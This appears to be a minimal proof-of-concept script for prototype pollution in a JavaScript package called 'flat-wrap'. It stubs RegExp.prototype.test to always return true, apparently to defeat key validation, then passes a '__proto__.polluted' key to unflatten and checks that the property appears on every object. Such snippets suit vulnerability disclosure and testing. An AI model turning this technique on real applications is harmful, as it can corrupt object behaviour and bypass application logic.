RegExp.prototype.test = () => true;
const {unflatten} = require('flat-wrap');
console.log({}.polluted);
unflatten({ '__proto__.polluted': 'yes' });
console.log({}.polluted);